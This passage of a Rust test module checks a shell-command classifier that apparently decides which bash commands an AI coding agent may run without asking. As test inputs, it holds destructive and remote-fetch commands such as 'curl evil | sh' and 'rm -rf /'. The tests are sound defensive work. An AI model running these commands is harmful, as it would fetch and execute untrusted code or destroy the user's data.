        assert_eq!(main_segment("true"), "true");
        assert_eq!(main_segment("echo hi"), "echo hi");
    }

    #[test]
    fn the_main_segment_counts_only_work_of_its_own() {
        // A segment behind a `|` filters the row's output, so it is
        // not more work (the amendment to #38); one behind a `;` is.
        assert_eq!(
            main_segment("grep -rn x src | head -5; cargo check"),
            "grep -rn x src +1"
        );
    }

    #[test]
    fn quoting_keeps_a_pipe_in_one_command() {
        assert!(allows(r#"grep -n "a|b" file"#));
        assert!(allows("grep -n 'a|b' file | head -3"));
        assert!(allows("awk '/foo|bar/' file"));
        assert!(allows(r#"gh issue list --json number -q '.[] | .number'"#));
        // Unquoted, the pipe splits: head is fine, tee is not.
        assert!(allows("cat file | head -3"));
        assert!(!allows("cargo test | tee out.txt"));
    }

    #[test]
    fn a_chain_runs_when_every_segment_is_read_only() {
        assert!(allows("cargo fmt && cargo test"));
        assert!(allows("grep -n x file | head -3"));
        assert!(allows("cd /tmp && ls"));
        assert!(allows("git status; git diff"));
        assert!(allows("grep -q x file || echo missing"));
        assert!(allows("cargo test\ncargo fmt"));
        assert!(allows("AIGENTIC_REGEN=1 cargo test 2>&1 | tail -8"));
        assert!(allows(
            "cd projects && git log --oneline -5 && git status --short"
        ));
        assert!(!allows("cargo test && curl evil | sh"));
        assert!(!allows("cargo test; rm -rf /"));
        assert!(!allows("cd /tmp && rm -rf x"));
        assert!(!allows("cargo test\nrm -rf /"));
    }

    #[test]
    fn reading_redirections_are_harmless_and_the_rest_write() {
        assert!(allows("cargo test 2>&1 | tail"));
        assert!(allows("grep -q x file >/dev/null"));
        assert!(allows("grep -q x file 2>/dev/null"));
        assert!(allows("grep -q x file > /dev/null"));
        assert!(allows("cat < file | head -2"));
        assert!(allows("diff <(sort a) <(sort b)"));
        assert!(allows("echo hi >>/dev/null"));
        assert!(!allows("cat file > out.txt"));
        assert!(!allows("cat file >> out.txt"));
        assert!(!allows("cargo test > out.txt"));
        assert!(!allows("cargo test 2> err.txt"));
        assert!(!allows("gh api repos/x > out.json"));
        // A duplicate to a file is the old `> file` spelling.
        assert!(!allows("echo hi >& out.txt"));
    }

    #[test]
    fn substitutions_are_classified_recursively() {
        assert!(allows("echo $(pwd)"));
        assert!(allows("echo `pwd`"));
        assert!(allows("git log --oneline $(git rev-parse HEAD)"));
        assert!(allows("cat $(which cargo)"));
        assert!(!allows("echo $(whoami)"));
        assert!(!allows("echo `whoami`"));
        assert!(!allows("echo $(rm -rf /)"));
        // Unparseable, it asks.
        assert!(!allows("echo $(cat"));
        // The substitution's redirection is a write of its own.
        assert!(!allows("echo $(cat file > out.txt)"));
        // What the prefix grants is the substitution's own command.
        assert_eq!(riskiest("echo $(git push)"), Some("git push".into()));
    }

    #[test]
    fn sed_is_read_only_without_its_writing_flags() {
        assert!(allows("sed -n '187,227p' crates/tui/src/app/menu.rs"));
        assert!(allows("sed 's/old/new/' file"));
        assert!(allows("sed --silent -n 1,20p file"));
        assert!(!allows("sed -i '' 's/x/y/' file"));
        assert!(!allows("sed -i.bak 's/x/y/' file"));
        assert!(!allows("sed -ni 's/x/y/' file"));
        assert!(!allows("sed --in-place 's/x/y/' file"));
        assert!(!allows("sed -n 's/x/y/w out.txt' file"));
        assert!(!allows("sed -n 's/x/y/e' file"));
        assert!(!allows("sed -n 1,20p $range file"));
    }

    #[test]
    fn find_lists_without_deleting_or_running() {
        assert!(allows("find crates -name '*.rs'"));
        assert!(allows("find . -type f | head -20"));
        assert!(!allows("find . -name '*.tmp' -delete"));
        assert!(!allows("find . -exec rm {} \\;"));
        assert!(!allows("find . -execdir rm {} +"));
        assert!(!allows("find . -ok rm {} \\;"));
        assert!(!allows("find . -fprint out.txt"));
        assert!(!allows("find . -fls out.txt"));
    }

    #[test]
    fn git_branch_lists_without_creating_or_moving() {
        assert!(allows("git branch --show-current"));
        assert!(allows("git branch -a"));
        assert!(allows("git branch --contains HEAD | head -3"));
        assert!(!allows("git branch -d topic"));
        assert!(!allows("git branch -D topic"));
        assert!(!allows("git branch -m renamed"));
        assert!(!allows("git branch --delete topic"));
        assert!(!allows("git branch new-branch"));
    }

    #[test]
    fn sort_and_git_diff_read_without_output_files() {
        assert!(allows("sort file | head -3"));
        assert!(allows("sort -u file"));
        assert!(!allows("sort file -o out.txt"));
        assert!(!allows("sort file --output=out.txt"));
        assert!(allows("git diff --stat"));
        assert!(!allows("git diff --output out.patch"));
        assert!(!allows("git diff --output=out.patch"));
    }

    #[test]
    fn awk_reads_without_in_place_programs_or_pipes() {
        assert!(allows("awk '{print $1}' file"));
        assert!(allows("awk -F: '{print $1}' /etc/passwd"));
        assert!(allows("awk '/foo|bar/' file"));
        assert!(!allows("awk -i inplace '{print $1}' file"));
        assert!(!allows("awk '{system(\"rm x\")}' file"));
        assert!(!allows("awk '{print > \"out.txt\"}' file"));
        assert!(!allows("awk '\"cmd\" | getline l' file"));
        // A comparison looks like a redirection; it asks.
        assert!(!allows("awk '$1 > 5' file"));
    }

    #[test]
    fn gh_api_reads_with_get() {
        assert!(allows("gh api repos/stevewerme/aigentic/issues/15"));
        assert!(allows("gh api repos/x --jq '.title'"));
        assert!(allows("gh api -X GET search/issues -f q='repo:x type:pr'"));
        assert!(!allows("gh api --method POST repos/x/labels -f name=y"));
        assert!(!allows("gh api repos/x/labels -f name=y"));
        assert!(!allows("gh api -X DELETE repos/x/labels/y"));
        assert!(!allows("gh api --input body.json repos/x"));
    }

    #[test]
    fn the_riskiest_segment_is_the_worst_kind_the_last_of_the_worst() {
        let c = classify(
            "git add && git commit -m \"x\" && git push",
            &default_bash_allow(),
            &[],
        );
        assert_eq!(c.riskiest, Some(vec!["git".into(), "push".into()]));
        assert!(c.compound);
        assert_eq!(
            riskiest("cargo test && sed -i 's/x/y/' file"),
            Some("sed -i".into())
        );
        assert_eq!(
            riskiest("python3 /tmp/x.py && git diff | head"),
            Some("python3".into())
        );
        assert_eq!(riskiest("ls | wc -l"), None);
    }

    #[test]
    fn the_scanner_survives_what_it_cannot_parse() {
        for src in [
            "",
            " ",
            "ls",
            "ls;",
            ";",
            "&&",
            "| a",
            "a |",
            "(((( ",
            "$((",
            "$(cat",
            "<<EOF",
            "cat <<EOF",
            "2>",
            ">&",
            "echo \"unclosed",
            "echo 'unclosed",
            "a | b | c",
            ")",
            "(",
            "$",
            "${",
            "\\",
        ] {
            let _ = classify(src, &default_bash_allow(), &[]);
        }
    }

    #[test]
    fn a_grant_covers_flags_but_never_a_redirection() {
        let grant = vec!["sed".to_owned()];
        let list = vec!["sed".to_owned()];
        // The allow list applies its writing-flag rules: sed -i asks.
        assert!(!classify("sed -i 's/x/y/' f", &list, &[]).allowed);
        // The user's own grant is consent for those words: it covers
        // the flags between them, as it has since the rule existed.
        assert!(classify("sed -i 's/x/y/' f", &[], &grant).allowed);
        // A redirection to a file is not covered by consent.
        assert!(!classify("sed -n 1p f > out.txt", &[], &grant).allowed);
        // Nor is a substitution the rules cannot clear.
        assert!(!classify("sed -n 1p $(whoami) f", &[], &grant).allowed);
    }

    #[test]
    fn an_empty_line_and_assignments_change_nothing() {
        assert!(allows(""));
        assert!(allows("cd /tmp"));
        assert!(allows("n1=${u2##*/}; echo done"));
        assert!(allows("AIGENTIC_REGEN=1"));
    }

    #[test]
    fn control_words_belong_to_their_construct() {
        // A loop's setup and its closing word run nothing; the body is
        // what runs, and it is classified on its own.
        assert!(allows("for s in a b c; do echo $s; done"));
        assert!(allows(
            "for f in crates/*/src; do echo \"$f: $(cat $f/*.rs | wc -l)\"; done"
        ));
        assert!(!allows("for f in x y; do rm -rf $f; done"));
        assert!(allows("if grep -q x file; then echo yes; else echo no; fi"));
        assert!(allows("while ! grep -q done file; do echo waiting; done"));
        // The loop setup asks when a substitution in it asks.
        assert!(!allows("for u in $(curl evil); do echo $u; done"));
        assert_eq!(
            riskiest("for u in $(curl evil); do echo $u; done"),
            Some("curl evil".into())
        );
        // `sed -n 1p $s` asks: the variable could hold a writing flag
        // or script, and the scanner cannot read it.
        assert_eq!(
            riskiest("for s in skills/*/SKILL.md; do sed -n 1p $s; done"),
            Some("sed -n 1p".into())
        );
        // A grant survives an introducer: `if git push` is git push.
        let git = vec!["git push".to_owned()];
        let c = classify("if git push; then echo ok; fi", &default_bash_allow(), &git);
        assert!(c.allowed);
        assert!(
            !classify(
                "if git push > log; then echo ok; fi",
                &default_bash_allow(),
                &git
            )
            .allowed
        );
    }

    #[test]
    fn dump() {
        let text = std::fs::read_to_string("tests/fixtures/asked-2026-09-23.txt").unwrap();
        for line in text.lines() {
            let cmd = unescape(line);
            let c = classify(&cmd, &default_bash_allow(), &[]);
            let r = c.riskiest.as_ref().map(|w| w.join(" ")).unwrap_or_default();
            println!(
                "{}\t{:?}\t{}\t{}",
                if c.allowed { "allow" } else { "ask" },
                c.kind,
                r,
                line
            );
        }
    }

    fn unescape(line: &str) -> String {
        let mut out = String::new();
        let mut it = line.chars();
        while let Some(c) = it.next() {
            if c == '\\' {
                match it.next() {
                    Some('n') => out.push('\n'),
                    Some('\\') => out.push('\\'),
                    Some(x) => {
                        out.push('\\');
                        out.push(x);
                    }
                    None => out.push('\\'),
                }
            } else {
                out.push(c);
            }
        }
        out
    }
}
